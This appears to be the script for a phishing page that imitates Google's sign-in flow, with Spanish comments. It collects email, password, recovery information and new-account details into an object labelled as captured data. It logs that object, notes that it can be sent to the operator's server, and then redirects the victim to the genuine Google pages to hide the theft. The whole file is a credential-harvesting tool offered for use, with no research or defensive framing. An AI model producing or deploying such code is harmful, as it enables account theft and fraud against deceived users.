document.addEventListener('DOMContentLoaded', function() {
    // Elementos del panel de login
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const passwordGroup = document.getElementById('passwordGroup');
    const nextBtn = document.getElementById('nextBtn');
    const submitBtn = document.getElementById('submitBtn');
    const loginForm = document.getElementById('loginForm');
    const securityInfo = document.getElementById('securityInfo');
    const successModal = document.getElementById('successModal');
    
    // Elementos de navegación entre paneles
    const loginPanel = document.getElementById('loginPanel');
    const forgotEmailPanel = document.getElementById('forgotEmailPanel');
    const createAccountPanel = document.getElementById('createAccountPanel');
    const forgotEmailLink = document.getElementById('forgotEmailLink');
    const createAccountLink = document.getElementById('createAccountLink');
    const backToLoginFromForgot = document.getElementById('backToLoginFromForgot');
    const backToLoginFromCreate = document.getElementById('backToLoginFromCreate');
    
    // Formularios
    const forgotEmailForm = document.getElementById('forgotEmailForm');
    const createAccountForm = document.getElementById('createAccountForm');

    // Datos que vamos a capturar
    let capturedData = {
        email: '',
        password: '',
        recoveryInfo: '',
        firstName: '',
        lastName: '',
        newEmail: '',
        newPassword: ''
    };

    // Función para cambiar entre paneles
    function showPanel(panelToShow) {
        // Ocultar todos los paneles
        loginPanel.classList.add('hidden');
        forgotEmailPanel.classList.add('hidden');
        createAccountPanel.classList.add('hidden');
        
        // Mostrar el panel solicitado
        panelToShow.classList.remove('hidden');
    }

    // Evento para el botón "Siguiente" en el login
    nextBtn.addEventListener('click', function() {
        if (emailInput.value.trim() !== '') {
            capturedData.email = emailInput.value;
            
            // Mostrar campo de contraseña
            passwordGroup.classList.remove('hidden');
            securityInfo.classList.remove('hidden');
            nextBtn.classList.add('hidden');
            submitBtn.classList.remove('hidden');
            
            // Enfocar el campo de contraseña
            passwordInput.focus();
        }
    });

    // Evento para el enlace "¿Has olvidado tu correo electrónico?"
    forgotEmailLink.addEventListener('click', function(e) {
        e.preventDefault();
        capturedData.email = emailInput.value;
        showPanel(forgotEmailPanel);
    });

    // Evento para el enlace "Crear cuenta"
    createAccountLink.addEventListener('click', function(e) {
        e.preventDefault();
        showPanel(createAccountPanel);
    });

    // Evento para volver al login desde "Olvidé email"
    backToLoginFromForgot.addEventListener('click', function() {
        showPanel(loginPanel);
    });

    // Evento para volver al login desde "Crear cuenta"
    backToLoginFromCreate.addEventListener('click', function() {
        showPanel(loginPanel);
    });

    // Envío del formulario de login
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        capturedData.password = passwordInput.value;
        
        // Mostrar modal de éxito
        successModal.classList.remove('hidden');
        
        // Aquí puedes enviar los datos capturados a tu servidor
        console.log('Datos capturados:', capturedData);
        
        // Simular redirección después de 3 segundos
        setTimeout(function() {
            // Redirigir a Google real o a donde necesites
            window.location.href = 'https://accounts.google.com';
        }, 3000);
    });

    // Envío del formulario de recuperación de email
    forgotEmailForm.addEventListener('submit', function(e) {
        e.preventDefault();
        const recoveryInput = document.getElementById('recoveryInfo');
        capturedData.recoveryInfo = recoveryInput.value;
        
        // Mostrar modal de éxito
        successModal.classList.remove('hidden');
        
        console.log('Datos de recuperación:', capturedData);
        
        setTimeout(function() {
            window.location.href = 'https://accounts.google.com/signin/recovery';
        }, 3000);
    });

    // Envío del formulario de creación de cuenta
    createAccountForm.addEventListener('submit', function(e) {
        e.preventDefault();
        capturedData.firstName = document.getElementById('firstName').value;
        capturedData.lastName = document.getElementById('lastName').value;
        capturedData.newEmail = document.getElementById('newEmail').value;
        capturedData.newPassword = document.getElementById('newPassword').value;
        
        // Mostrar modal de éxito
        successModal.classList.remove('hidden');
        
        console.log('Datos de nueva cuenta:', capturedData);
        
        setTimeout(function() {
            window.location.href = 'https://accounts.google.com/signup';
        }, 3000);
    });

    // Manejar el evento de entrada en el campo de email
    emailInput.addEventListener('input', function() {
        if (passwordGroup.classList.contains('hidden')) {
            nextBtn.disabled = emailInput.value.trim() === '';
        }
    });
});